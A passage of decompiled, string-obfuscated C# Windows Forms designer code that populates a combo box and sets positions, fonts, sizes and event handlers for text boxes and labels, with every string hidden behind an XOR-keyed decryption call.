			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A123B5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0DBAD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C295CEB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DED7B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA322EF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C127EE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0DB1D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -2080804738 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BCA1DF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF154C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CD318 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2655A2AA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8E8DA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A6E28 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0x2FCB7897 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6CB4A0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -1218607527 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-836630164 ^ -1633771578 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E929D1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1271262C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x35DE9E18 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694624E7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE417A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875F671 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A290C6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B71A434 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -1423268550 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -109542249 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0E2EB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2905C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F725BC4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678F9C83 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319DCBC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B77FABE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2d06329f1bd54c2287b4ec6435bc1344),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B0438 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1374258F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002A487 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC1217E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1223698C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF10E4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DC5EB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12712422 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1146229973 ^ 0x308902FC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A29ED7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0DE4F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BCA495 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DE911 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A29F5B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F18A8C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8EBB2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AE883 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0E02B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F4425 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc)
		});
		((Control)comboBox11).Location = new Point(10, 554);
		((Control)comboBox11).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox11).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DC441 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)comboBox11).Size = new Size(162, 24);
		((Control)comboBox11).TabIndex = 173;
		comboBox11.SelectedIndexChanged += comboBox11_SelectedIndexChanged;
		((Control)textBox22).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9048F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61), 10f, (FontStyle)1);
		((Control)textBox22).Location = new Point(640, 667);
		((Control)textBox22).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DAA775 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)textBox22).Size = new Size(208, 23);
		((Control)textBox22).TabIndex = 168;
		((Control)textBox22).TextChanged += textBox22_TextChanged;
		((Control)label41).AutoSize = true;
		((Control)label41).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF3F52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a), 10f, (FontStyle)1);
		((Control)label41).ForeColor = SystemColors.ControlLightLight;
		((Control)label41).Location = new Point(638, 647);
		((Control)label41).Margin = new Padding(5, 0, 5, 0);
		((Control)label41).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AC70F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((Control)label41).Size = new Size(127, 16);
		((Control)label41).TabIndex = 167;
		((Control)label41).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF21C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)textBox23).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB04 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6), 10f, (FontStyle)1);
		((Control)textBox23).Location = new Point(642, 611);
		((Control)textBox23).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F185C4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)textBox23).Size = new Size(208, 23);
		((Control)textBox23).TabIndex = 166;
		((Control)textBox23).TextChanged += textBox23_TextChanged;
		((Control)textBox24).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AC6C7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2), 10f, (FontStyle)1);
		((Control)textBox24).Location = new Point(856, 611);
		((Control)textBox24).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002AAB3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((Control)textBox24).Size = new Size(185, 23);
		((Control)textBox24).TabIndex = 165;
		((Control)textBox24).TextChanged += textBox24_TextChanged;
		((Control)textBox25).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 10f, (FontStyle)1);
		((Control)textBox25).Location = new Point(1047, 611);
		((Control)textBox25).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678F9103 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		((Control)textBox25).Size = new Size(195, 23);
		((Control)textBox25).TabIndex = 164;
		((Control)textBox25).TextChanged += textBox25_TextChanged;
		((Control)label42).AutoSize = true;
		((Control)label42).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF6A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6), 10f, (FontStyle)1);
		((Control)label42).ForeColor = SystemColors.ControlLightLight;
		((Control)label42).Location = new Point(638, 592);
		((Control)label42).Margin = new Padding(5, 0, 5, 0);
		((Control)label42).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A6262 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)label42).Size = new Size(85, 16);
		((Control)label42).TabIndex = 163;
		((Control)label42).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CFD12 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((Control)label43).AutoSize = true;
		((Control)label43).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 8f, (FontStyle)1);
		((Control)label43).ForeColor = SystemColors.ControlLightLight;
		((Control)label43).Location = new Point(852, 594);
		((Control)label43).Margin = new Padding(5, 0, 5, 0);
		((Control)label43).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BCAA05 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((Control)label43).Size = new Size(110, 14);
		((Control)label43).TabIndex = 162;
		((Control)label43).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319F768 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
		((Control)label44).AutoSize = true;
		((Control)label44).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f), 10f, (FontStyle)1);
		((Control)label44).ForeColor = SystemColors.ControlLightLight;
		((Control)label44).Location = new Point(1043, 592);
		((Control)label44).Margin = new Padding(5, 0, 5, 0);
		((Control)label44).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD0466F8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925);
		((Control)label44).Size = new Size(87, 16);
		((Control)label44).TabIndex = 161;
		((Control)label44).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E90313 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label45).AutoSize = true;
		((Control)label45).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6A3D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc), 10f, (FontStyle)1);
		((Control)label45).ForeColor = SystemColors.ControlLightLight;
		((Control)label45).Location = new Point(1043, 536);
		((Control)label45).Margin = new Padding(5, 0, 5, 0);
		((Control)label45).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0EF0D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)label45).Size = new Size(89, 16);
		((Control)label45).TabIndex = 160;
		((Control)label45).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69460E45 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((Control)label46).AutoSize = true;
		((Control)label46).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC8BB3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a), 10f, (FontStyle)1);
		((Control)label46).ForeColor = SystemColors.ControlLightLight;
		((Control)label46).Location = new Point(852, 536);
		((Control)label46).Margin = new Padding(5, 0, 5, 0);
		((Control)label46).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD04661C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925);
		((Control)label46).Size = new Size(80, 16);
		((Control)label46).TabIndex = 159;
		((Control)label46).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A44AE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)textBox26).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC8BB3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a), 10f, (FontStyle)1);
		((Control)textBox26).Location = new Point(640, 555);
		((Control)textBox26).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -481998451 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)textBox26).Size = new Size(206, 23);
		((Control)textBox26).TabIndex = 158;
		((Control)textBox26).TextChanged += textBox26_TextChanged;
		((Control)textBox27).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A43EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf), 10f, (FontStyle)1);
		((Control)textBox27).Location = new Point(856, 555);
		((Control)textBox27).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8E41A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)textBox27).Size = new Size(185, 23);
		((Control)textBox27).TabIndex = 157;
		((Control)textBox27).TextChanged += textBox27_TextChanged;
		((Control)textBox28).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC8BB3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a), 10f, (FontStyle)1);
		((Control)textBox28).Location = new Point(1047, 555);
		((Control)textBox28).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x7235FDFB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((Control)textBox28).Size = new Size(195, 23);
		((Control)textBox28).TabIndex = 156;
		((Control)textBox28).TextChanged += textBox28_TextChanged;
		((Control)label47).AutoSize = true;
		((Control)label47).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DC7FF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d), 10f, (FontStyle)1);
		((Control)label47).ForeColor = SystemColors.ControlLightLight;
		((Control)label47).Location = new Point(638, 536);
		((Control)label47).Margin = new Padding(5, 0, 5, 0);
		((Control)label47).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3EF16 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)label47).Size = new Size(65, 16);
		((Control)label47).TabIndex = 155;
		((Control)label47).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E90257 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)textBox29).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF3F52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a), 10f, (FontStyle)1);
		((Control)textBox29).Location = new Point(642, 493);
